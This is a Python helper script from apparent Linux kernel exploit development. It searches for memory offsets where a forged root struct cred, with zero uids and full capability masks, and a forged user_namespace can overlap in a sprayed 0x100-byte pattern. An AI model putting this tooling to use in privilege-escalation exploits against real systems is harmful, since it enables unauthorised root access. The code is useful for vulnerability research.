# Feasibility probe: ignore addresses/blocks, just ask whether the *fixed*
# byte requirements of the fake cred / fake user_namespace can coexist in a
# period-0x100 pattern for some pair of phases.
WLO, WHI = 0x18, 0xf8
NLONG = 0x7fffffffffffffff

def cred_fixed(pc):
    """residue -> set of allowed byte values; '*': pointer/self (free)."""
    m = {}
    def put(off, val, size):
        for i in range(size):
            b = (val >> (8*i)) & 0xff
            m.setdefault((pc+off+i) & 0xff, set()).add(b)
    def free(off, size):
        for i in range(size):
            m.setdefault((pc+off+i) & 0xff, set()).add(None)
    free(0x00, 8)          # self pointer
    free(0x08, 8)          # marker / gid / suid
    free(0x10, 4)          # sgid
    put(0x14, 0, 4)        # euid
    put(0x18, 0, 4)        # egid
    put(0x1c, 0xffffffff, 4)  # fsuid
    put(0x20, 0, 8)        # fsgid|securebits
    put(0x28, 0, 8)        # cap_inh
    put(0x30, 0xffffffffffffffff, 8)
    put(0x38, 0xffffffffffffffff, 8)
    put(0x40, 0xffffffffffffffff, 8)
    put(0x48, 0, 8)        # ambient
    put(0x50, 0, 0x28)     # keyrings
    free(0x78, 0x28)       # five pointers
    put(0xa0, 0, 0x10)     # rcu
    return m

def ns_fixed(pn):
    m = {}
    def put(off, val, size):
        for i in range(size):
            m.setdefault((pn+off+i) & 0xff, set()).add((val >> (8*i)) & 0xff)
    def free(off, size):
        for i in range(size):
            m.setdefault((pn+off+i) & 0xff, set()).add(None)
    put(0x00, 1, 4)        # nr_extents
    put(0x08, 0, 4)        # first
    put(0x0c, 0, 4)        # lower_first
    free(0x10, 8)          # count == low32(P) (nonzero as u32)
    put(0x48, 1, 4)
    put(0x58, 1, 4)
    free(0xd8, 8)          # parent (unreachable)
    free(0xe0, 4)          # level (unreachable)
    put(0x104, 0x40000000, 4)
    free(0x210, 8)         # P (alias of 0x10)
    put(0x268, NLONG, 8)
    return m

def merge_ok(a, b):
    bad = []
    for r in set(a) & set(b):
        sa, sb = a[r], b[r]
        if None in sa or None in sb:
            continue
        if sa != sb:
            bad.append((r, sa, sb))
    return bad

def check_pc_pn(pc, pn):
    A, B = cred_fixed(pc), ns_fixed(pn)
    bad = merge_ok(A, B)
    # count field: bytes at pn+0x10..0x14 (part of pointer) must make a
    # nonzero u32.  Only reachable when all four bytes are unconstrained or
    # their fixed value is compatible; if any is fixed, require u32 != 0.
    cnt = 0
    okc = True
    for i in range(4):
        r = (pn+0x10+i) & 0xff
        allowed = A.get(r)
        if allowed is None or None in allowed:
            okc = False      # at least one free byte -> can force nonzero
    if not bad:
        return True, (0 if okc else 1)
    return False, bad

if __name__ == '__main__':
    hits = []
    for pc in range(WLO, 0xf0, 8):
        for pn in range(WLO, 0xf0, 8):
            ok, why = check_pc_pn(pc, pn)
            if ok:
                hits.append((pc, pn, why))
    print('pc/pn pairs with no fixed conflict:', len(hits))
    for h in hits[:40]:
        print('  pc=%#04x pn=%#04x countfree=%d' % h)
